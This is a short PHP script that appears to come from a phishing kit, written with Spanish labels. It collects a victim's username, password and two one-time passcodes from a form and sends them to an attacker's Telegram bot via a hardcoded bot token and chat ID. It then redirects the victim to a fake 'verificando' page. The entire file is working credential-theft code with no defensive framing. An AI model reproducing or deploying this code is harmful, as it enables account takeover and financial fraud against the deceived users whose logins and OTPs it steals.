<?php
session_start();


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['txt-usuario'];
    $password = $_POST['txt-password'];
    $otp1 = $_POST["txt-otp"];
    $otp2 = $_POST["txt-otp2"];


    // Now you can construct the message with the OTP
   $message = "✅ PASO 2\n👨🏻‍💻 USUARIO: $usuario\n🔒 CONTRASEÑA: $password\n💰 OTP1: $otp1\n💰 OTP2: $otp2";

    // Send the data to Telegram bot
    $telegramToken = "7493863236:AAEfvXDdU-E4sjfCY9U-JIyV0T13_RxPB7c";
    $chatId = "-1002508406827";

    $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    // Send the message using cURL
    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect back to the form page or display a success message
    header("Location: verificando.html");
    exit();
}
?>
